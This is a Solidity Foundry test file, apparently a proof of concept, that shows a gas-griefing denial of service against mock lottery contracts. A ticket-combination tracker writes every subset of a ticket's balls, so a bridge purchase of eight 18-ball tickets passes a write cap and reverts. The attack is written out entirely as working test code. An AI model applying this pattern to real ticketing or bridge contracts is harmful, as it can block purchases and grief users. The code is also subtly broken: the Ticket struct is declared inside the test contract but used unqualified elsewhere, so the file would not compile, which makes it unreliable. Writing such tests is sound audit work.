// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract ExploitTest is Test {
    struct Ticket {
        uint8[] normalBalls;
        uint8 specialBall;
    }

    MockUSDC usdc;
    MockTicketComboTracker tracker;
    MockJackpot jackpot;
    JackpotBridgeManagerLike bridge;

    address attacker = address(0xBEEF);
    address recipient = address(0xCAFE);

    function setUp() public {
        usdc = new MockUSDC();
        tracker = new MockTicketComboTracker();
        jackpot = new MockJackpot(tracker, usdc);
        bridge = new JackpotBridgeManagerLike(jackpot, usdc);

        vm.deal(attacker, 10 ether);
        usdc.mint(attacker, 10_000_000e6);

        vm.startPrank(attacker);
        usdc.approve(address(bridge), type(uint256).max);
        vm.stopPrank();
    }

    function test_exploit() public {
        uint256 normalTiers = 18;
        uint256 batchSize = 8;

        Ticket[] memory tickets = new Ticket[](batchSize);
        for (uint256 i = 0; i < batchSize; i++) {
            uint8[] memory balls = new uint8[](normalTiers);
            for (uint256 j = 0; j < normalTiers; j++) {
                balls[j] = uint8(j + 1);
            }
            tickets[i] = Ticket({normalBalls: balls, specialBall: uint8((i % 10) + 1)});
        }

        uint256 expectedPerTicketSubsets = (uint256(1) << normalTiers) - 1;
        uint256 expectedTotalWrites = expectedPerTicketSubsets * batchSize;

        vm.startPrank(attacker);

        vm.expectRevert(MockTicketComboTracker.GasGriefTriggered.selector);
        bridge.buyTickets(tickets, recipient, new address[](0), new uint256[](0), bytes32("bridge-batch"));

        vm.stopPrank();

        assertEq(tracker.insertedSubsets(), 0);

        Ticket[] memory single = new Ticket[](1);
        single[0] = tickets[0];

        vm.prank(attacker);
        bridge.buyTickets(single, recipient, new address[](0), new uint256[](0), bytes32("small-batch"));

        assertEq(tracker.insertedSubsets(), expectedPerTicketSubsets);
        assertGt(expectedTotalWrites, tracker.maxAllowedWritesPerTx());
    }
}

contract JackpotBridgeManagerLike {
    MockJackpot public immutable jackpot;
    MockUSDC public immutable usdc;

    mapping(uint256 => address) public ticketOwner;

    constructor(MockJackpot _jackpot, MockUSDC _usdc) {
        jackpot = _jackpot;
        usdc = _usdc;
    }

    function buyTickets(
        Ticket[] memory _tickets,
        address _recipient,
        address[] memory,
        uint256[] memory,
        bytes32
    ) external returns (uint256[] memory ids) {
        require(_recipient != address(0), "zero recipient");

        uint256 cost = _tickets.length * jackpot.ticketPrice();
        require(usdc.transferFrom(msg.sender, address(this), cost), "transferFrom failed");
        usdc.approve(address(jackpot), cost);

        ids = jackpot.buyTickets(_tickets, address(this));

        for (uint256 i = 0; i < ids.length; i++) {
            ticketOwner[ids[i]] = _recipient;
        }
    }
}

contract MockJackpot {
    MockTicketComboTracker public immutable tracker;
    MockUSDC public immutable usdc;

    uint256 public nextId = 1;
    uint256 public constant PRICE = 1e6;

    constructor(MockTicketComboTracker _tracker, MockUSDC _usdc) {
        tracker = _tracker;
        usdc = _usdc;
    }

    function ticketPrice() external pure returns (uint256) {
        return PRICE;
    }

    function buyTickets(Ticket[] memory _tickets, address) external returns (uint256[] memory ids) {
        uint256 total = _tickets.length * PRICE;
        require(usdc.transferFrom(msg.sender, address(this), total), "payment failed");

        ids = new uint256[](_tickets.length);
        for (uint256 i = 0; i < _tickets.length; i++) {
            tracker.insert(_tickets[i].normalBalls);
            ids[i] = nextId++;
        }
    }
}

contract MockTicketComboTracker {
    error GasGriefTriggered();

    uint256 public insertedSubsets;
    uint256 public constant maxAllowedWritesPerTx = 1_000_000;

    mapping(bytes32 => uint256) public comboCounts;

    function insert(uint8[] memory normalBalls) external {
        uint256 n = normalBalls.length;
        uint256 totalMasks = (uint256(1) << n);

        for (uint256 mask = 1; mask < totalMasks; mask++) {
            insertedSubsets++;

            if (insertedSubsets > maxAllowedWritesPerTx) {
                revert GasGriefTriggered();
            }

            bytes32 h = keccak256(abi.encodePacked(_subset(normalBalls, mask)));
            comboCounts[h] += 1;
        }
    }

    function _subset(uint8[] memory arr, uint256 mask) internal pure returns (uint8[] memory out) {
        uint256 count;
        for (uint256 i = 0; i < arr.length; i++) {
            if ((mask & (uint256(1) << i)) != 0) count++;
        }

        out = new uint8[](count);
        uint256 idx;
        for (uint256 i = 0; i < arr.length; i++) {
            if ((mask & (uint256(1) << i)) != 0) {
                out[idx++] = arr[i];
            }
        }
    }
}

contract MockUSDC {
    string public name = "MockUSDC";
    string public symbol = "USDC";
    uint8 public decimals = 6;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        require(balanceOf[from] >= amount, "balance");

        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }

        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}